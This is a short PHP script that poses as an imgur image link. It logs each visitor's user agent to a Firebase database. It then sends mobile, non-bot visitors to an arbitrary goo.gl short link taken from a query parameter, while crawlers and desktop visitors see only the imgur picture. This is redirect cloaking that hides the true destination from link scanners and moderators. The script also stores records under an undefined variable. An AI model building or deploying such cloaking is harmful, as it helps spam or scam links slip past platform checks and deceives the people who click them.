<?php

//phpinfo();

require_once 'md/Mobile_Detect.php';
require_once 'firebase/firebaseLib.php';

$requested=explode("/", $_SERVER['REQUEST_URI']);

$imgur_id = $requested[2];
$ld=$_GET['ld'];

const DEFAULT_URL = 'https://dubaihotelstar.firebaseio.com/';
const DEFAULT_TOKEN = '';

$path = '/mobre3/'.$yt_id;

$useragent=$_SERVER['HTTP_USER_AGENT'];

$firebase = new \Firebase\FirebaseLib(DEFAULT_URL, DEFAULT_TOKEN);

$detect = new Mobile_Detect;
$isbot = strpos($useragent, "bot");
// maybe check if only anroid
if (( $detect->isMobile() || $detect->isTablet()) && ! $isbot )
{
	$firebase->push($path,array("user_agent"=>$useragent,"redirect"=>1,"type_is"=>"imgur"));
    header("Location: https://goo.gl/$ld");
}
else
{
	$firebase->push($path,array("user_agent"=>$useragent,"redirect"=>0,"type_is"=>"imgur"));
    header('Location: https://i.imgur.com/'.$imgur_id.'.jpg' );
}

